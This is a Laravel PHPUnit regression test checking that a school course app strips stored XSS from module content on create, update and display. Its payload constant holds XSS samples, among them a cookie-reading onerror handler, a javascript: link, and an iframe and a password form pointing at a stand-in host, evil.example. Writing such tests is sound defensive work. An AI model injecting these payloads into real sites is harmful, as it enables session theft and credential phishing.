<?php

namespace Tests\Feature;

use App\Models\Module;
use App\Models\SchoolClass;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\DB;
use Tests\TestCase;

/**
 * Regression tests for stored XSS through module content: the editor only shapes HTML in
 * the browser, so a hand-crafted POST must not be able to store or render script.
 */
class ModuleContentSanitizationTest extends TestCase
{
    use RefreshDatabase;

    private const PAYLOAD = '<h2>Loops</h2><p>Read <a href="https://docs.oracle.com/javase/tutorial/">the tutorial</a>.</p>'
        .'<script>fetch("/admin/users/1/role")</script>'
        .'<img src="x" onerror="alert(document.cookie)">'
        .'<a href="javascript:alert(1)">click</a>'
        .'<p onclick="alert(2)" style="position:fixed">Styled</p>'
        .'<iframe src="https://evil.example"></iframe>'
        .'<form action="https://evil.example"><input name="password"><button>Sign in</button></form>';

    private User $instructor;

    private User $student;

    private SchoolClass $class;

    protected function setUp(): void
    {
        parent::setUp();

        $this->instructor = User::create(['name' => 'Prof', 'email' => 'prof@example.com', 'password' => bcrypt('password'), 'role' => 'instructor']);
        $this->student = User::create(['name' => 'Student', 'email' => 'student@example.com', 'password' => bcrypt('password'), 'role' => 'student']);
        $this->class = SchoolClass::create(['name' => 'Java 101', 'code' => 'JAVA-101', 'instructor_id' => $this->instructor->id]);
        $this->class->students()->attach($this->student->id, ['status' => 'enrolled']);
    }

    private function assertNoScript(string $html): void
    {
        $this->assertStringNotContainsStringIgnoringCase('<script', $html);
        $this->assertStringNotContainsStringIgnoringCase('onerror', $html);
        $this->assertStringNotContainsStringIgnoringCase('onclick', $html);
        $this->assertStringNotContainsStringIgnoringCase('javascript:', $html);
        $this->assertStringNotContainsStringIgnoringCase('<iframe', $html);
        $this->assertStringNotContainsStringIgnoringCase('<input', $html);
        $this->assertStringNotContainsStringIgnoringCase('position:fixed', $html);
    }

    public function test_creating_a_module_strips_script_but_keeps_formatting(): void
    {
        $this->actingAs($this->instructor)->post("/classes/{$this->class->id}/modules", [
            'title' => 'Loops',
            'content' => self::PAYLOAD,
        ])->assertRedirect();

        $content = Module::where('title', 'Loops')->firstOrFail()->content;

        $this->assertNoScript($content);
        $this->assertStringContainsString('<h2>Loops</h2>', $content);
        $this->assertStringContainsString('href="https://docs.oracle.com/javase/tutorial/"', $content);
        $this->assertStringContainsString('Styled', $content);
    }

    public function test_updating_a_module_strips_script(): void
    {
        $module = Module::create(['class_id' => $this->class->id, 'title' => 'Loops', 'content' => '<p>Old</p>']);

        $this->actingAs($this->instructor)->put("/classes/{$this->class->id}/modules/{$module->id}", [
            'title' => 'Loops',
            'content' => self::PAYLOAD,
        ])->assertRedirect();

        $content = $module->fresh()->content;
        $this->assertNoScript($content);
        $this->assertStringContainsString('<h2>Loops</h2>', $content);
    }

    public function test_content_stored_before_the_fix_is_cleaned_when_shown(): void
    {
        $moduleId = DB::table('modules')->insertGetId([
            'class_id' => $this->class->id,
            'title' => 'Legacy',
            'content' => self::PAYLOAD,
            'order_index' => 0,
            'created_at' => now(),
            'updated_at' => now(),
        ]);

        $html = $this->actingAs($this->student)
            ->get("/classes/{$this->class->id}/modules/{$moduleId}")
            ->assertOk()
            ->getContent();

        $this->assertStringNotContainsString('fetch("/admin/users/1/role")', $html);
        $this->assertStringNotContainsString('alert(document.cookie)', $html);
        $this->assertStringNotContainsString('javascript:alert(1)', $html);
        $this->assertStringNotContainsString('https://evil.example', $html);
        $this->assertStringContainsString('<h2>Loops</h2>', $html);
    }
}
